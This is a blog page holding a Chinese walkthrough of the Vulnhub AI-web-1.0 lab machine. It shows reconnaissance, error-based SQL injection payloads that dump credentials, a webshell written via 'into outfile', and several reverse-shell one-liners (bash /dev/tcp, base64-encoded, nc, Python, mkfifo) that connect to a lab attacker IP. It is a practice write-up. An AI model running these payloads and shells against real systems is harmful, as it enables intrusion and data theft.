@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="krismile" />
+
+
+
+<meta name="description" content="Vulnhub渗透测试-AI-web1.0在vulnhub.com下载靶机https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;ai-web-1,353&#x2F;  攻击机：kali:192.168.19.132 靶机：AI-WEB-1.0:192.168.19.133 （靶机和攻击机需要在同一网段）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub渗透测试--AI-web1.0">
+<meta property="og:url" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/index.html">
+<meta property="og:site_name" content="KrismileBlog">
+<meta property="og:description" content="Vulnhub渗透测试-AI-web1.0在vulnhub.com下载靶机https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;ai-web-1,353&#x2F;  攻击机：kali:192.168.19.132 靶机：AI-WEB-1.0:192.168.19.133 （靶机和攻击机需要在同一网段）">
+<meta property="og:locale">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/1.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/2.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/3.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/4.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/5.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/6.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/7.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/8.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/9.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/10.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/11.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/12.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/13.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/14.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/15.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/16.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/17.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/18.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/19.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/20.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/21.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/22.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/23.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/24.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/25.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/26.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/27.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/28.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/29.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/30.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/31.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/32.png">
+<meta property="og:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/33.png">
+<meta property="article:published_time" content="2022-07-17T08:08:08.000Z">
+<meta property="article:modified_time" content="2022-08-12T09:08:51.948Z">
+<meta property="article:author" content="krismile">
+<meta property="article:tag" content="渗透测试、SQL注入、反弹shell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/1.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="KrismileBlog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/head.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Vulnhub渗透测试--AI-web1.0 | KrismileBlog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/head.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/archives/">首页</a></li>
+                        
+                            <li><a href="/tags/">标签</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="/nichengxin1234@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ICS/" rel="tag">ICS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">Phar反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf%E6%AF%94%E8%B5%9B/" rel="tag">ctf比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/md5/" rel="tag">md5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80/" rel="tag">web基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80%EF%BC%8CJWT/" rel="tag">web基础，JWT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%81SQL%E6%B3%A8%E5%85%A5%E3%80%81%E5%8F%8D%E5%BC%B9shell/" rel="tag">渗透测试、SQL注入、反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">靶机</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">哈哈哈</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/head.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">首页</a></li>
+                
+                    <li><a href="/tags/">标签</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="/nichengxin1234@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-Vulnhub渗透测试-AI-web1.0" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/" class="article-date">
+      <time datetime="2022-07-17T08:08:08.000Z" itemprop="datePublished">2022-07-17</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Vulnhub渗透测试--AI-web1.0
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%81SQL%E6%B3%A8%E5%85%A5%E3%80%81%E5%8F%8D%E5%BC%B9shell/" rel="tag">渗透测试、SQL注入、反弹shell</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="Vulnhub渗透测试-AI-web1-0"><a href="#Vulnhub渗透测试-AI-web1-0" class="headerlink" title="Vulnhub渗透测试-AI-web1.0"></a>Vulnhub渗透测试-AI-web1.0</h2><p>在vulnhub.com下载靶机<code>https://www.vulnhub.com/entry/ai-web-1,353/</code></p>
+<blockquote>
+<p>攻击机：kali:192.168.19.132</p>
+<p>靶机：AI-WEB-1.0:192.168.19.133</p>
+<p>（靶机和攻击机需要在同一网段）</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>kali中，使用nmap命令进行探测</p>
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/1.png" alt="image-20220718112311165" style="zoom:80%;">
+
+<p>192.168.19.133开放了80端口，访问试试</p>
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/2.png" alt="image-20220718162652898" style="zoom: 50%;">
+
+<p>提示：甚至谷歌都没有搜索我的内容！那继续后台扫描<code>dirb http://192.168.19.133</code>（dirb是一个基于字典的web目录扫描工具，查找现有的或隐藏的web对象）</p>
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/3.png" alt="image-20220718163915862" style="zoom:80%;">
+
+<p>发现有robots.txt文件存在(robots.txt告知搜索引擎允许或不允许抓取哪些页面)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: </span><br><span class="line">Disallow: /m3diNf0/</span><br><span class="line">Disallow: /se3reTdir777/uploads/</span><br></pre></td></tr></table></figure>
+
+<p>发现禁止所有搜索引擎访问<code>/m3diNf0/</code>和<code>/se3reTdir777/uploads/</code>页面，没有得到具体有用信息，继续扫描这两个目录</p>
+<p>①探测目录&#x2F;m3diNf0&#x2F;</p>
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/4.png" alt="image-20220718165939102">
+
+<p>发现<code>/m3diNf0/</code>目录下还有<code>info.php</code>存在</p>
+<p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/5.png" alt="image-20220718173019605"></p>
+<p><strong>&#x2F;home&#x2F;www&#x2F;html&#x2F;web1x443290o2sdf92213 为网站的绝对路径</strong></p>
+<p>②探测&#x2F;se3reTdir777&#x2F;uploads&#x2F;目录，发现没什么东西，但看这个uploads或许存在文件上传漏洞，接着探测&#x2F;se3reTdir777&#x2F;目录发现有index.php登录页面</p>
+<p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/6.png" alt="image-20220726104038862"></p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/7.png" alt="image-20220726104204844"></p>
+<p>首先试试输入单引号，结果报错，说明存在SQL注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>不知道传参的参数名，抓包看看，可以在bp直接进行手工注入</p>
+<h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/8.png" style="zoom: 80%;">
+
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/9.png" alt="image-20220727102549268" style="zoom: 50%;">
+
+<p>下面可以开始爆数据库，表等等，这里使用报错注入</p>
+<p>数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=2&#x27; and (select extractvalue(1,concat(&#x27;~&#x27;,(select database()))))#&amp;Operation=Submit</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/10.png" alt="image-20220727103350832" style="zoom:50%;">
+
+<p>表：systemUser,user</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=2&#x27; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))#&amp;Operation=Submit</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/11.png" alt="image-20220727103616716" style="zoom: 50%;">
+
+<p>字段名：id,userName,password</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=2&#x27; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;systemUser&#x27;))))#&amp;Operation=Submit</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/12.png" alt="image-20220727110021365" style="zoom:50%;">
+
+<p>值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=2&#x27; and (select extractvalue(1,concat(0x7e,(select group_concat(concat_ws(&#x27;:&#x27;,userName,password))from aiweb1.systemUser))))#&amp;Operation=Submit</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/13.png" alt="image-20220727112857391" style="zoom:50%;">
+
+<p>发现它是name、password登录，但没有这样的登录页面，简言之，没用</p>
+<h4 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h4><p>爆库：（1）aiweb1、（2）information_schema</p>
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/14.png" alt="image-20220726171504785" style="zoom: 67%;">
+
+<p>发现可通过基于错误的盲注，基于时间的盲注，联合查询来实现SQL注入</p>
+<p>爆表：</p>
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/15.png" alt="image-20220727172823364" style="zoom: 67%;">
+
+<p>爆字段名、值：</p>
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/16.png" alt="image-20220727215931022" style="zoom:67%;">
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>在渗透测试或者漏洞评估的过程中，提权是非常重要的一步，对于渗透来说，获得的权限越高，控制的服务器就会越多。首先通过漏洞获取webshell，然后通过shell进行提权。</p>
+<p>权限分级：</p>
+<p>匿名访问权限、来宾权限、用户权限、管理员权限、系统权限</p>
+<p><strong>什么是shell?</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell是一种应用程序，提供一个界面，用户通过这个界面访问操作系统内核的服务。</span><br><span class="line">正向shell：我主动连接服务器，服务器开启ssh端口</span><br><span class="line">反向shell：服务器主动连接我，我监听某一端口</span><br></pre></td></tr></table></figure>
+
+<h4 id="采用手工注入下的反弹"><a href="#采用手工注入下的反弹" class="headerlink" title="采用手工注入下的反弹"></a>采用手工注入下的反弹</h4><h5 id="尝试into-outfile来获取shell"><a href="#尝试into-outfile来获取shell" class="headerlink" title="尝试into outfile来获取shell"></a>尝试into outfile来获取shell</h5><p>上面在<code>/m3diNf0/</code>目录下发现了网站的绝对路径<code>/home/www/html/web1x443290o2sdf92213</code></p>
+<p>在文件上传&#x2F;se3reTdir777&#x2F;uploads目录下写入一句话木马</p>
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/17.png" alt="image-20220727145948217" style="zoom:50%;">
+
+<p>蚁剑连接成功</p>
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/18.png" alt="image-20220727151115199" style="zoom:50%;">
+
+<h5 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell:"></a><strong>反弹shell</strong>:</h5><p><strong>Linux反弹shell</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">攻击机：nc -lvvp <span class="number">6666</span></span><br><span class="line">客户机：bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">19.132</span>/<span class="number">6666</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>	这个IP是攻击机的IP</span><br><span class="line">  受害者执行的命令不会在本机上回显，会在攻击机上回显</span><br><span class="line">   上述命令解释：</span><br><span class="line">		bash -i					创建一个交互式的bash</span><br><span class="line">		&gt;&amp;					   将输出重定向到文件</span><br><span class="line">		/dev目录				  存放linux操作系统的各种设备</span><br><span class="line">		/dev/tcp				文件不存在，但是打开该文件相当于发起了socket，建立了一个连接</span><br><span class="line">		/<span class="number">192.168</span>.<span class="number">19.132</span>/<span class="number">6666</span>	  表示socket连接的ip和端口</span><br><span class="line">		<span class="number">0</span>&gt;&amp;<span class="number">1</span>				表示标准输入重定向到标准输出，即我们可以远程输入，并且可以得到远程的输出</span><br><span class="line">Linux反弹shell其他方法：</span><br><span class="line">    base64变形：&#123;<span class="keyword">echo</span>,YmFzaCUyMC1pJTIwJTNFJTI2JTIwL2Rldi90Y3AvMTkyLjE2OC4xOS4xMzIvNjY2NiUyMDAlM0UlMjYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">    nc方式：nc -e /bin/sh <span class="number">192.168</span>.<span class="number">19.132</span> <span class="number">6666</span></span><br><span class="line">    python变形：python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.19.132&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line">    服务器很多“-e”功能删除了：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">192.168</span>.<span class="number">19.132</span> <span class="number">6666</span> &gt;/tmp/f</span><br><span class="line">    奇怪方法<span class="number">1</span>：exec <span class="number">5</span>&lt;&gt;/dev/tcp/<span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">4444</span>;cat &lt;&amp;<span class="number">5</span> | <span class="keyword">while</span> read line; <span class="keyword">do</span> <span class="variable">$line</span> <span class="number">2</span>&gt;$<span class="number">5</span> &gt;$<span class="number">5</span>; done</span><br><span class="line">	 奇怪方法<span class="number">2</span>：<span class="number">0</span>&lt;&amp;<span class="number">196</span>;exec <span class="number">196</span>&lt;&gt;/dev/tcp/<span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">4444</span>; sh &lt;&amp;<span class="number">196</span> &gt;&amp;<span class="number">196</span> <span class="number">2</span>&gt;&amp;<span class="number">196</span></span><br></pre></td></tr></table></figure>
+
+<p>先尝试简单的命令<code>nc -e /bin/sh 192.168.19.132 6666</code>，提示-e功能没有（<strong>提醒：IP地址为攻击机的IP地址</strong>）</p>
+<p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/19.png" alt="image-20220727220612523"></p>
+<p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.19.132 6666 &gt;/tmp/f</code>，反弹成功</p>
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/20.png" alt="image-20220727220839285" style="zoom:67%;">
+
